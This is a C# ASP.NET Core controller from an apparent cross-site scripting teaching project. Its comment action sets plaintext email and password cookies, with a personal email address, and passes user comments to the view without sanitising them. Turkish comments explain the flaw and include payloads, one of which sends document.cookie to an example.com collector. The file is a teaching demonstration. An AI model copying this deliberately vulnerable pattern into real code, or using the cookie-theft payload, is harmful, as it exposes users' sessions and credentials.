using Microsoft.AspNetCore.Mvc;
using System.Diagnostics;
using XSS.Web.Models;

namespace XSS.Web.Controllers
{
    public class HomeController : Controller
    {
        private readonly ILogger<HomeController> _logger;

        public HomeController(ILogger<HomeController> logger)
        {
            _logger = logger;
        }

        public IActionResult CommentAdd()
        {
            HttpContext.Response.Cookies.Append("email","ahmetsarikaya0696@gmail.com");
            HttpContext.Response.Cookies.Append("password","1234");
            return View();
        }

        [HttpPost]
        public IActionResult CommentAdd(string name, string comment)
        {
            // Datayı Validation yapmadan direkt gönderdiğimizde XSS ' e açık hale getirmiş oluyoruz.
            // Datayı HtmlSanitizer ile temizleyerek ViewBag'e göndermeliyiz
            ViewBag.name = name;
            ViewBag.comment = comment;
            // XSS ' e açık bir uygulamada aşağıdaki script tagi yazılarak cookieler okunabilir.
            // <script>alert(document.cookie)</script>
            // <script>new Image().src="https://www.example.com/readcookie?accouninfo="+document.cookie</script> ile cookiler bir servera gönderilebilir.

            // Encode edilmiş kod
            // <span>&lt;script&gt;alert(&#x27;alert&#x27;)&lt;/script&gt;</span> 
            return View();
        }

        public IActionResult Index()
        {
            return View();
        }

        public IActionResult Privacy()
        {
            return View();
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }
    }
}